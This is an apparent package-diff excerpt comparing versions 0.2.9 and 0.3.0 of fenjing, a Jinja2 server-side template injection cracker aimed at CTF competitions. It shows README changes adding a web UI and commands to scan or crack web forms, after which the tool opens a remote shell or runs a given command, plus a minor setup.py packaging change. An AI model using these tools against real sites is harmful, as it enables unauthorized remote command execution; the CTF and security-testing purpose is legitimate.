             input_field (str): 需要测试的input
 
         Returns:
```

### Comparing `fenjing-0.2.9/fenjing.egg-info/PKG-INFO` & `fenjing-0.3.0/fenjing.egg-info/PKG-INFO`

 * *Files 6% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.9
+Version: 0.3.0
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -25,38 +25,38 @@
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
 ```shell
 pip install fenjing
-python -m fenjing scan --url 'http://xxx/'
+python -m fenjing webui
 ```
 
 ### 下载并运行docker镜像
 
 ```shell
 docker pull marven11/fenjing
-docker run --net host -it marven11/fenjing scan --url 'http://xxx/'
+docker run --net host -it marven11/fenjing webui
 ```
 
 ### 手动安装
 
 ```shell
 git clone https://github.com/Marven11/Fenjing
 cd Fenjing
 python -m pip install -r requirements.txt
-python -m fenjing scan --url 'http://xxx/'
+python -m fenjing webui
 ```
 
 ### 手动构建Docker镜像
 
 ```shell
 docker build -t fenjing .
-docker run -it --net host fenjing scan --url 'http://xxx/'
+docker run -it --net host fenjing webui
 ```
 
 ## 特性
 
 支持绕过：
 
 - `'`和`"`
@@ -117,23 +117,27 @@
     - 其中的字符串也支持上面的任意字符串绕过
 
 
 ## 详细使用
 
 ### 作为命令行脚本使用
 
+- webui: 网页UI
+  - 顾名思义，网页UI
+  - 默认端口11451
 - scan: 扫描整个网站
   - 从网站中根据form元素提取出所有的表单并攻击
   - 扫描成功后会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing scan --url 'http://xxx/'`
 - crack: 对某个特定的表单进行攻击
   - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
   - 攻击成功后也会提供一个模拟终端或执行给定的命令
   - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
-
+- get-config: 对某个特定的表单进行攻击，但是只获取flask config
+  - 参数大致上和crack相同
 ```
 Usage: python -m fenjing scan [OPTIONS]
 
 Options:
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
```

### Comparing `fenjing-0.2.9/setup.py` & `fenjing-0.3.0/setup.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,8 +1,9 @@
 import setuptools
+import os
 
 with open("README.md", "r") as f:
     long_description = f.read()
 
 with open("VERSION", "r") as f:
     version = f.read().strip()
 
@@ -22,9 +23,12 @@
     url="https://github.com/Marven11/Fenjing",
     packages=setuptools.find_packages(),
     classifiers=[
         "Programming Language :: Python :: 3.9",
         "License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)",
         "Operating System :: OS Independent",
     ],
-    install_requires=requirements
+    install_requires=requirements,
+    package_data={
+        "fenjing": ["templates/*", "static/*"],
+    },
 )
```

